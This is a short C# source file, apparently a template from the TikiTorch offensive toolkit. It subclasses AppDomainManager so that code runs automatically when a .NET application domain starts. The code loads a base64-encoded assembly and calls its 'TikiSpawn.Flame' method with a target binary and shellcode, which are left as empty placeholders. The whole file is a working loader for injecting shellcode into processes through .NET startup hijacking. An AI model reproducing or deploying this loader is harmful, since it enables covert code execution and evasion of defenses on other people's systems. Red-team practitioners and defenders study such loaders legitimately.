using System;
using System.Reflection;
using System.Runtime.InteropServices;
[ComVisible(true)]
[Guid("0ba9a3e0-3ecf-487f-9aae-c28e5af6dce8")]
[ClassInterface(ClassInterfaceType.None)]
public sealed class TikiTorchDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		Program.Run();
        return;
    }
}
public class Program
{
	static string dll = "";
	static string binary = @"";
	static string shellcode = "";
	public static void Run()
	{
		var asm = Assembly.Load(Convert.FromBase64String(dll));
        var type = asm.GetType("TikiSpawn");
        var instance = Activator.CreateInstance(type);
        type.InvokeMember("Flame", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, instance, new object[] { binary, shellcode });
	}
}